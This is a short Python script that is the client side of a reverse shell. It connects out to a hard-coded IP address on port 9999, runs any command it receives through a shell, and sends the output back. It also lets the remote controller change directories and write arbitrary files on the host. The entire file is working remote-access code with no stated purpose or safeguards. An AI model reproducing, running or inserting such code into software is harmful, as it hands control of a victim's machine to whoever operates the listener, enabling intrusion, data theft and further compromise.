import socket
import os
import subprocess
import time
from threading import *


file_name = ""


def file_write(content):
    global file_name
    f = open(file_name, "w")
    f.write(content)
    f.close()


s = socket.socket()
host = '192.168.43.230'
port = 9999

s.connect((host, port))
print("connected")

while True:
    data = s.recv(3024)
    if data[:3].decode("utf-8") == 'ftf':
        string = str(data[4:].decode("utf-8"))
        start_time = time.time()
        t1 = Thread(target=file_write, args=(string,))
        t1.start()
        t1.join()
        end_time = time.time()
        success = "done in : " + str(end_time - start_time)
        print(success)
        currentWD = os.getcwd() + "> "
        s.send(str.encode(success + "\n" + currentWD))
    elif data[:1].decode("utf-8") == '~':
        string = str(data[2:].decode("utf-8"))
        file_name = string
        currentWD = os.getcwd() + "> "
        success = "file name selected : "+file_name+" "
        s.send(str.encode(success + "\n" + currentWD))
    else:
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))

        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte, "utf-8")
            currentWD = os.getcwd() + "> "
            send_msg = output_str + currentWD
            s.send(str.encode(send_msg))

            print(output_str)
